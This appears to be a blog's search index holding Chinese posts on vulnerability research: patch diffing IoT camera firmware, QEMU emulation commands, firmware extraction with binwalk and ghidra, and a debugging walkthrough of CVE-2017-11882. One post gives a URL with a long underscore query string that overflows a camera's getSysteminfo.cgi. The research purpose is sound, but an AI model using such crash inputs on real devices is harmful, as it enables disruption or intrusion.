<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>漏洞查找之比较补丁</title>
      <link href="2020/12/10/%E6%BC%8F%E6%B4%9E%E6%9F%A5%E6%89%BE%E4%B9%8B%E6%AF%94%E8%BE%83%E8%A1%A5%E4%B8%81/"/>
      <url>2020/12/10/%E6%BC%8F%E6%B4%9E%E6%9F%A5%E6%89%BE%E4%B9%8B%E6%AF%94%E8%BE%83%E8%A1%A5%E4%B8%81/</url>
      
        <content type="html"><![CDATA[<p>搜索camara找到一个类似二进制漏洞文件（缓冲区溢出）</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/%E9%80%89%E5%8C%BA_001.png" alt="搜索cve"></p><p>双击进来之后有一些简单的描述</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/%E9%80%89%E5%8C%BA_002.png" alt="漏洞描述"></p><p>下载到了有和没有漏洞的固件，用bindiff比较了一下，发现区别最大的函数</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/%E9%80%89%E5%8C%BA_003.png" alt="区别函数"></p><p>ghidra打开跳转到对应地址（L快捷键可以重命名变量，;（英文的分号）可以下注释）</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/%E9%80%89%E5%8C%BA_004.png" alt="两个文件的对应位置"></p><p>可以看到，左边的补丁添加了一个local_414变量，最多拷贝7次，多了就会造成溢出</p><h2 id="更多信息"><a href="#更多信息" class="headerlink" title="更多信息"></a>更多信息</h2><p>进一步向上追踪，发现程序在这里调用漏洞函数。</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/%E9%80%89%E5%8C%BA_005.png" alt="调用漏洞函数"></p><p>FUN_00403804函数很简单，仅仅是判断字符串<code>&quot;public/getSysteminfo.cgi“</code>后面还有其他东西或者是只有”\0”或”?”也就是没有东西了。<br>应该是url的一部分</p><p>到这里已经知道了访问哪个url会调用漏洞函数。</p><p>接下来确定哪个字段的溢出</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/%E9%80%89%E5%8C%BA_006.png" alt="漏洞点"></p><p>想要确定一个变量是什么就找什么地方用到了这个变量或者是什么时候定义了这个变量。在本层函数里没有找到有意义的对param_6的引用。</p><p>继续向上查找找到了param_6字段的值cgiQueryString</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1607602382108.png" alt="字段来源"></p><p>在URL后面紧跟着”?”的部分就叫cgiQueryString</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>也就是说访问 <a href="http://127.0.0.1/public/getSysteminfo.cgi?a_b_c">http://127.0.0.1/public/getSysteminfo.cgi?a_b_c</a>_……   很多下划线就会造成溢出</p>]]></content>
      
      
      <categories>
          
          <category> 整理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> iot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>qemu-system启动命令</title>
      <link href="2020/12/08/qemu-system%E5%90%AF%E5%8A%A8%E5%91%BD%E4%BB%A4/"/>
      <url>2020/12/08/qemu-system%E5%90%AF%E5%8A%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在调试iot系统的时候只运行一个服务软件会运行失败，这是需要用到系统模式，运行起来一个系统，这样程序运行的环境更充足，成功的概率也更大。</p><p>之前调试mips架构程序，用这个可以满足，现在改成arm的，启动的时候仅仅换磁盘镜像，内核这些东西还是会启动失败，这里介绍一下这些命令都是干嘛的。</p><pre class=" language-bash"><code class="language-bash">qemu-system-mips -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -nographic -append <span class="token string">"root=/dev/sda1 rw console=tty0 init=/linuxrc ignore_loglevel"</span> -net nic,vlan<span class="token operator">=</span>0 -net tap,vlan<span class="token operator">=</span>0,ifname<span class="token operator">=</span>tap0 -redir tcp:2333::2333 -redir tcp:8080::80</code></pre><h2 id="命令介绍"><a href="#命令介绍" class="headerlink" title="命令介绍"></a>命令介绍</h2><h3 id="qemu-system-mips"><a href="#qemu-system-mips" class="headerlink" title="qemu-system-mips"></a>qemu-system-mips</h3><p>qemu分好几个版本</p><ul><li>qemu-mips 是运行mips架构程序的qemu</li><li>static  这个是静态链接的版本，一般用来chroot ./ ./qemu-mips-static /bin/busybox (chroot ./ 是把本目录当做根目录运行程序)</li><li>qemu-system 是系统模式版本，可以开启一个虚拟系统。</li></ul><h3 id="M-malta"><a href="#M-malta" class="headerlink" title="-M malta"></a>-M malta</h3><p>-M参数是指示仿真的硬件</p><h3 id="kernel"><a href="#kernel" class="headerlink" title="-kernel"></a>-kernel</h3><p>指定内核镜像，最好使用比较新的内核镜像</p><h3 id="hda"><a href="#hda" class="headerlink" title="-hda"></a>-hda</h3><p>设置虚拟硬盘驱动并为其使用指定的映像文件，更高级的使用 -driver</p><p>参考<a href="https://wiki.gentoo.org/wiki/QEMU/Options">https://wiki.gentoo.org/wiki/QEMU/Options</a></p><h3 id="nographic"><a href="#nographic" class="headerlink" title="-nographic"></a>-nographic</h3><p>没有图形化界面</p><h3 id="append"><a href="#append" class="headerlink" title="-append"></a>-append</h3><p>传入linux内核的参数</p><h4 id="root-dev-sda1"><a href="#root-dev-sda1" class="headerlink" title="root=/dev/sda1"></a>root=/dev/sda1</h4><p> 内核认为的根文件系统的位置，sda、hda等是由内核进行逻辑命名的和硬件无关。如果boot分区就是根分区就是/dev/sda1（注：grep显示的root(hd0,0)和这个指令的含义是一样的）</p><p>参考<a href="https://blog.51cto.com/fuwenchao/1337471">https://blog.51cto.com/fuwenchao/1337471</a></p><h4 id="console-tty0"><a href="#console-tty0" class="headerlink" title="console=tty0"></a>console=tty0</h4><p> console即控制台，linux内核通过consle参数来选择控制台，console=tty0 console=lp0 console=ttyS0同时存在是可以工作的（console=ttyS0 console=ttyS1这样是不行的），输出传递给每个consle，输入只从最后一个获取。ttyS表示串口，tty表示虚拟终端，lp表示平行端口(咱也不懂)，ttyUSB表示usb端口</p><p>参考<a href="https://tldp.org/HOWTO/Remote-Serial-Console-HOWTO/configure-kernel.html">https://tldp.org/HOWTO/Remote-Serial-Console-HOWTO/configure-kernel.html</a></p><h4 id="init-linuxrc"><a href="#init-linuxrc" class="headerlink" title="init=/linuxrc"></a>init=/linuxrc</h4><p>linuxrc所做的事情</p><ul><li>/linuxrc文件决定在挂载真正的文件系统之前所需完成的事情(譬如加载必要的网络驱动或者加载ext3文件系统).</li><li>/linuxrc加载必要的模块.</li><li>/linuxrc挂载根文件系统</li><li>/linuxrc调用pivot_root来改变根目录</li></ul><p>主要是加载木块用的，如果内核没有动态模块是不需要加此选项的，在linux操作系统里可以加入noinitrd告诉boot loader不使用initrd<br>参考<a href="https://blog.csdn.net/s651665496/article/details/50773073">https://blog.csdn.net/s651665496/article/details/50773073</a></p><h3 id="net，-netdev"><a href="#net，-netdev" class="headerlink" title="-net，-netdev"></a>-net，-netdev</h3><p>默认是Pass-through<br> <strong>这种方法只适用于TCP和UDP链接，ping是ICMP不行</strong></p><ul><li> <code>-netdev user</code> qemu进程将会为VM中的每个进程创建TCP和UDP连接，虚拟机没有可以从外界访问的地址</li><li> <code>-device virtio-net,netdev=vmnic -netdev user,id=vmnic</code> (被推荐)，带有VirtIO支持的Pass-Through</li><li> <code>-netdev user,id=vmnic,hostfwd=tcp:127.0.0.1:9001-:22</code> 让qemu监听9001端口，该端口将会被转发到端口22的VM。ssh -p 9001能够登录到VM  只能实现向虚拟机中拷贝文件，不能从虚拟机拷出来文件</li><li> <code>-device virtio-net,netdev=vmnic -netdev tap,id=vmnic,ifname=vnet0,script=no,downscript=no</code>虚拟网络(TAP) 在qemu主机上创建一个新设备(vnet0),’cable’的另一端在vm上</li></ul><p>上面那种写法是要是使用网桥的方式，配置网桥比较麻烦</p><p>参考<a href="https://wiki.gentoo.org/wiki/QEMU/Options">https://wiki.gentoo.org/wiki/QEMU/Options</a></p><p><strong>注：谷歌上搜索qemu -net是直接搜不到的（谷歌会过滤）   应该搜索 qemu ‘-net’</strong></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一般没有输出的问题都是<code>-append</code>里面传递的参数有问题，按照官方镜像的说明即可</p><p><a href="https://people.debian.org/~aurel32/qemu/">这里提供了编译好的镜像</a></p><p>一个一个手动下载比较麻烦，这里整理了一个简单的脚本</p><p><a href="https://github.com/tower111/iot/blob/master/%E6%95%B4%E7%90%86/qemu%E4%BD%BF%E7%94%A8.md">https://github.com/tower111/iot/blob/master/%E6%95%B4%E7%90%86/qemu%E4%BD%BF%E7%94%A8.md</a></p>]]></content>
      
      
      <categories>
          
          <category> 整理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> iot </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-11882分析</title>
      <link href="2020/12/07/%20CVE-2017-11882%E5%88%86%E6%9E%90/"/>
      <url>2020/12/07/%20CVE-2017-11882%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="https://github.com/houjingyi233/office-exploit-case-study/tree/master/CVE-2017-11882%26CVE-2018-0802%26CVE-2018-0798">https://github.com/houjingyi233/office-exploit-case-study/tree/master/CVE-2017-11882%26CVE-2018-0802%26CVE-2018-0798</a><br><a href="https://www.anquanke.com/post/id/94841#h2-6">https://www.anquanke.com/post/id/94841#h2-6</a><br><a href="https://www.anquanke.com/post/id/87311">https://www.anquanke.com/post/id/87311</a><br><a href="https://www.anquanke.com/post/id/87284">https://www.anquanke.com/post/id/87284</a><br><a href="https://github.com/embedi/CVE-2017-11882">https://github.com/embedi/CVE-2017-11882</a></p><h2 id="分析文件版本"><a href="#分析文件版本" class="headerlink" title="分析文件版本"></a>分析文件版本</h2><p>win7 x86+office2007<br>eqnedt32.exe（这个软件是office2007自带的）</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1607355350654.png" alt="文件"></p><p>不是作为一个libc库而是一个单独的软件调试起来也比较方便</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/%E9%80%89%E5%8C%BA_058.png" alt="漏洞"></p><p>上图标注的strcpy就是漏洞函数，动态调试一下可以看到呗拷贝的是一个字符串”TIMES NEW ROMAN “</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/%E9%80%89%E5%8C%BA_059.png" alt="od分析"></p><p>查了一下这是一种字体</p><p>从<a href="https://github.com/embedi/CVE-2017-11882">https://github.com/embedi/CVE-2017-11882</a>上下载了样本<br>（这东西已经是poc了，到这里项目的内容实际已经结束，为了学习分析方法，这里继续分析）</p><h2 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h2><p>下载样本进行测试（会被杀软无情删掉，我这边杀软一声不吭就删了），测试样本</p><h3 id="加载要调试的文件"><a href="#加载要调试的文件" class="headerlink" title="加载要调试的文件"></a>加载要调试的文件</h3><p>要调试的文件是正常运行的时候加载了一个exe，要调试那个exe。<br>如果是动态链接库，od提供了方案：alt+e可以找到加载的动态库（注：alt+c可以回到反汇编窗口，alt+b可以查看断点，alt+m可以查看加载不同段的加载地址对于开启pie的程序可以通过ida看到的地址找到对应地址），在动态库入口下断点即可。</p><p>但是exe需要修改windows注册表</p><p>打开注册表编辑器（regedit）</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/%E9%80%89%E5%8C%BA_061.png" alt="注册表"></p><p>图中标了要修改值的路径，新加了一项EQNEDT32.EXE，加入了对应的值，上面的路径是调试器的路径（实际上包含中文路径应该也行，害怕中文路径不行改了个名字）</p><p>添加完这一项之后运行EQNEDT32.EXE这个程序就会弹出od调试界面</p><p>双击测试样本，在弹出的od界面中下断点（地址从ida里面找到，ctl+g能让光标跳转到某个地址，f2可以下断点）</p><p>在第二次运行到拷贝的时候(右击edi寄存器的值，数据窗口中跟随，可以在数据窗口中看到填充的值，应该是shellcode和返回地址)</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/%E9%80%89%E5%8C%BA_063.png" alt="数据窗口看到的内容"></p><p>在程序返回时返回到了WinExec函数</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/%E9%80%89%E5%8C%BA_064.png" alt="返回"><br><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/%E9%80%89%E5%8C%BA_065.png" alt="返回到了这里"></p><h3 id="添加"><a href="#添加" class="headerlink" title="添加"></a>添加</h3><p>有时候不知道断点应该下到哪里。</p><p>可以猜要完成某个功能需要使用什么api，可以使用api断点（当程序调用对应api的时候会断下来）（api就是操作系统给用户提供的接口，是一个个函数实现不同的功能）</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/%E9%80%89%E5%8C%BA_062.png" alt="设置api断点"></p><p>可以在对应的函数处下断点(一般是CreateProcess创建进程)</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1607400064074.png" alt="进程函数"></p><ul><li>很多函数有A和W版本，A表示Ascii，W表示宽字节</li><li>CreateProcess，CreateThread是创建进程线程</li><li>CreateRemoteThread是创建远程线程，是在本进程里创建一个其他进程的线程（一般实现一些动态链接库注入，API钩取之类的操作）</li></ul><p>下完断点之后继续运行（f9）程序会暂停在断点处如图</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/%E9%80%89%E5%8C%BA_067.png" alt="暂停"></p><p>注意上面的地址，这不是用户的地址空间，可以用快捷键Alt+f9运行到用户地址空间（需要程序能运行到返回）</p><h2 id="从编写poc角度分析漏洞"><a href="#从编写poc角度分析漏洞" class="headerlink" title="从编写poc角度分析漏洞"></a>从编写poc角度分析漏洞</h2><p>待补充</p>]]></content>
      
      
      <categories>
          
          <category> 整理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows漏洞复现环境搭建</title>
      <link href="2020/12/07/windows%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%20/"/>
      <url>2020/12/07/windows%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%20/</url>
      
        <content type="html"><![CDATA[<h2 id="进程查看工具"><a href="#进程查看工具" class="headerlink" title="进程查看工具"></a>进程查看工具</h2><p>process hacker 可以在看雪上下载</p><p><a href="https://tool.pediy.com/index-detail-106.htm">https://tool.pediy.com/index-detail-106.htm</a></p><h2 id="动态调试工具"><a href="#动态调试工具" class="headerlink" title="动态调试工具"></a>动态调试工具</h2><p>ollydbg 吾爱破解的一个比较强大的工具（9年前的版本现在依然好用）</p><p>试了一下windbg调试，命令一大堆，用起来极其不友好，果断放弃</p><p><a href="https://down.52pojie.cn/?query=ollydbg">https://down.52pojie.cn/?query=ollydbg</a></p><p>如果对windbg感兴趣参考，配置起来也不是十分麻烦。建议用ollydbg</p><p><a href="https://www.anquanke.com/post/id/205867">https://www.anquanke.com/post/id/205867</a></p><p><strong>具体使用参见cve-2017-11882分析</strong></p>]]></content>
      
      
      <categories>
          
          <category> 整理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iot工具使用</title>
      <link href="2020/12/06/iot%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
      <url>2020/12/06/iot%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p><strong>注：以项目为主线，完成任务并且有时间可以深入分析，之后会补充详细的工具使用</strong></p><p>这里对常用工具进行说明。</p><p>下载或提取到的固件是包含整个操作系统和文件系统的。包括boot-loader（一般是uboot，用来引导系统启动），linux内核，文件系统。需要的是文件系统，厂商自己定义的代码一般在文件系统里主要分析的也是文件系统里的文件</p><ul><li>binwalk可以用来解压，把一个固件解压找到它的文件系统分析单个文件。</li><li>ghidra可以用来反编译，iot固件一般不用x86架构用的arm和mips比较多。ghidra是一个比较好的其他架构语言反编译工具</li><li>qemu 动态调试工具。调试起来比较麻烦，从项目角度动态调试一般用不到</li></ul><h2 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>官方的安装文档，注意需要把上面的工具都安装了（不安装也能用但是会有一些文件系统解压不出来）</p><p><a href="https://github.com/ReFirmLabs/binwalk/blob/master/INSTALL.md">https://github.com/ReFirmLabs/binwalk/blob/master/INSTALL.md</a></p><p>比较坑的是上面写了一堆下面说官方准备好了一键安装脚本</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1607247168490.png" alt="一键安装脚本"></p><h3 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h3><pre class=" language-bash"><code class="language-bash">E: 无法定位软件包 cramfsprogs</code></pre><p>可以取官网下载这个包<a href="https://packages.ubuntu.com/xenial/amd64/cramfsprogs/download">https://packages.ubuntu.com/xenial/amd64/cramfsprogs/download</a><br>然后安装<code>dpkg -i xxxx.deb</code></p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><pre class=" language-bash"><code class="language-bash">binwalk -Me xxxx.bin</code></pre><ul><li>M表示递归（镜像可能会进行很多层压缩）</li><li>e表示解压，会生成一个文件夹</li></ul><p>用<code>find . |grep httpd</code>可以找到httpd文件所在的目录</p><ul><li>find是搜索一个路径，递归底下所有的文件夹，文件</li><li>|grep表示过滤，只在显示器上显示包含httpd的目录</li></ul><p><code>file xxx</code>命令可以查看二进制文件的信息</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1607247595325.png" alt="file命令"></p><ul><li>LSB表示小端字节序</li><li>ARM是cpu架构</li></ul><h2 id="ghidra"><a href="#ghidra" class="headerlink" title="ghidra"></a>ghidra</h2><p>ghidra 用于反编译mips架构（一种cpu架构，路由器比较常用，跟arm，x86，amd一类）的程序。ida只能看到mips架构程序的汇编，这个工具可以反编译。结合ida使用。</p><p>效果如图 </p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/ghidra_usage.png" alt="ghidra_usage"></p><p>下载 <a href="https://ghidra-sre.org/">https://ghidra-sre.org/</a> （暂时不能用，在其他地方找资源吧）</p><h3 id="常用命令："><a href="#常用命令：" class="headerlink" title="常用命令："></a>常用命令：</h3><ul><li>g：跳转到某个地址或函数</li><li>ctrl+shift+e 搜索字符串</li><li>查找交叉引用如下</li></ul><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/ghidra_usage.png" alt="ghidra_usage"></p><h2 id="其他工具参考"><a href="#其他工具参考" class="headerlink" title="其他工具参考"></a>其他工具参考</h2><p><a href="https://github.com/tower111/iot/blob/master/%E6%95%B4%E7%90%86/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%A2%B3%E7%90%86.md">https://github.com/tower111/iot/blob/master/%E6%95%B4%E7%90%86/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%A2%B3%E7%90%86.md</a></p>]]></content>
      
      
      <categories>
          
          <category> 整理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> iot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞整理iot-2</title>
      <link href="2020/12/06/%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86iot-2/"/>
      <url>2020/12/06/%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86iot-2/</url>
      
        <content type="html"><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>这次比较幸运找到了一个比较完整的分析文档。以及用到的固件。</p><p><a href="https://payatu.com/blog/munawwar/trendNet-wireless-camera-buffer-overflow-vulnerability">https://payatu.com/blog/munawwar/trendNet-wireless-camera-buffer-overflow-vulnerability</a></p><h2 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h2><p>遇到的第一个问题：解压失败，给文章作者发了邮件，他说没有问题（给作者发邮件询问是很好的解决方案思路）</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1607246143216.png" alt="邮件回应"></p><p>作者说没问题，应该是我的binwalk的问题，按照官网的过程重新安装了一下binwalk，安装成功。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>按照文章的描述g跳转到对应位置</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1607248898144.png" alt="漏洞点"></p><p>在21行拷贝的时候没有检查字符串的大小</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>之后补充</p>]]></content>
      
      
      <categories>
          
          <category> 整理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> iot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞整理iot</title>
      <link href="2020/12/03/%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86iot/"/>
      <url>2020/12/03/%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86iot/</url>
      
        <content type="html"><![CDATA[<h2 id="查找方法"><a href="#查找方法" class="headerlink" title="查找方法"></a>查找方法</h2><p>在cve list查找cemara（router也行，但是路由器通常是mips架构的）<br><a href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=camera">https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=camera</a></p><p>或者查找开源库</p><h2 id="定位到感兴趣的条目"><a href="#定位到感兴趣的条目" class="headerlink" title="定位到感兴趣的条目"></a>定位到感兴趣的条目</h2><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606975606345.png" alt="感兴趣的条目"></p><p>对它感兴趣是因为它的漏洞描述：固件为0x20x之前的VIVOTEK IP摄像机设备通过精心设计的HTTP标头具有基于堆栈的缓冲区溢出。</p><ul><li>影响范围比较广（固件可能容易获得，一次可以找到影响的固件比较多）</li><li>栈溢出明显的二进制漏洞</li></ul><p>但是这个条目的解释非常少，我对这个条目进行搜索</p><h2 id="搜索更多信息"><a href="#搜索更多信息" class="headerlink" title="搜索更多信息"></a>搜索更多信息</h2><p>最关键的有两个点：</p><ul><li>说明文档，对漏洞位置的说明</li><li>固件下载，能够下载到固件并且能够解压</li></ul><p>接下来将会解决这两个问题</p><h3 id="说明文档查找"><a href="#说明文档查找" class="headerlink" title="说明文档查找"></a>说明文档查找</h3><p>直接搜索cve编号或cve编号+“poc” 关键字</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606976197899.png" alt="搜索方法"></p><p>这里面很多都是对漏洞的报告，需要多打开几个</p><p>我这里找到了一个报告多包含了一点信息</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606976114478.png" alt="得到稍微多一点的信息"></p><p>告诉了我关键漏洞函数位置以及cwe编号</p><p>介绍：cwe是收集的漏洞类型，是对一个漏洞关键代码的摘要</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606976396336.png" alt="cwe"></p><p>从cwe可以帮助理解这是什么漏洞</p><h3 id="固件下载和解压"><a href="#固件下载和解压" class="headerlink" title="固件下载和解压"></a>固件下载和解压</h3><p>可以从查找道德信息里面确定漏洞存在于那些版本的固件，从官网下载固件，有些分析文章会直接给出固件下载链接</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606976577686.png" alt="固件版本"></p><p>找到固件上面说0x20a以前的版本，就随便找之前的版本下载（字母尽量跟前面的VVTK匹配，匹配不了也没办法先下载一个试试）</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606976787784.png" alt="官网找到固件"></p><p>下载之后查询签名并解压（一般是.bin文件但是有时候是其他后缀名）</p><p><code>binwalk -Y AB6117-VVTK-0101f.flash.pkg</code><br>命令可以查询签名得到架构的信息（一般是x86，x86_64，i386，amd64，mips，arm）架构信息查不到无所谓</p><p>然后解压<code>binwalk -Me AB6117-VVTK-0101f.flash.pkg</code>  解压完成会多出一个下划线开头的文件夹，可能内容很多也可能很少</p><p>接下来要确定一些信息，解压是否成功，漏洞程序是哪一个</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606977157042.png" alt="查找命令"></p><ul><li>find 命令是递归输出指定目录下的所有文件、文件夹</li><li>.表示目录（可以指定为要搜索的目录）</li><li>|grep是用来过滤字符串的</li><li>busybox就是要过滤的字符串，只输出包含busybox的字符串，其他的都不会输出</li></ul><p>上面的结果表示搜索到了busybox这个文件（或者文件夹）<br>busybox是嵌入式设备常用（基本上都要用）的工具，它里面集成了很多linux常用命令并且文件本身比较小。这里搜索到了这个文件说明解压成功了（也可以通过tree命令查看目录里面文件多少判断是否解压成功）</p><p>还可以通过这个文件得到系统的架构</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">(</span>base<span class="token punctuation">)</span> ➜  _AB6117-VVTK-0101f.flash.pkg.extracted git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ <span class="token function">file</span> ./_31.extracted/_rootfs.img.extracted/squashfs-root/bin/busybox./_31.extracted/_rootfs.img.extracted/squashfs-root/bin/busybox: ELF 32-bit LSB executable, ARM, EABI5 version 1 <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</code></pre><p>file命令打印出了这个文件的架构是arm，LSB表示小段字节序，32-bit表示32位</p><h2 id="分析漏洞"><a href="#分析漏洞" class="headerlink" title="分析漏洞"></a>分析漏洞</h2><h3 id="找到漏洞文件"><a href="#找到漏洞文件" class="headerlink" title="找到漏洞文件"></a>找到漏洞文件</h3><p>可以根据分析的文章找到具体是哪个文件。但是有时候没有给出是哪个文件</p><p>一般是httpd文件(如果是http服务的漏洞)</p><p>同样的方法可以查找到httpd所在的目录</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606978141110.png" alt="httpd"></p><h3 id="分析httpd文件"><a href="#分析httpd文件" class="headerlink" title="分析httpd文件"></a>分析httpd文件</h3><p>需要用到的工具：ghidra，ida安装包在硬盘里（漏洞收集目录）</p><p>搜索漏洞函数定位</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606978452382.png" alt="漏洞函数"></p><p>本函数没有意义查找谁调用了这个函数</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606978564442.png" alt="定位函数"></p><p>发现只有一个地方调用了这个函数</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606978601748.png" alt="向上"></p><p>可以看出一些问题搜索了这些参数的含义可以知道这里三个参数只是限制日志等级进程之类的东西，没有限制字符串长度<br>这是我用c把这段代码摘出来做的测试</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606978882585.png" alt="测试"></p><p>对字符串的限制在上一层函数</p><p>找到了很多函数，但是只有一个函数的参数是变量，这里应该是一个有漏洞的函数</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606978967466.png" alt="继续查找上一层函数"></p><p>但是需要动态调试来验证，比较麻烦先放在这里。（因为poc部分实在不行可以是一段文字描述）</p>]]></content>
      
      
      <categories>
          
          <category> 整理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> iot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux库说明以及如何修改动态链接库</title>
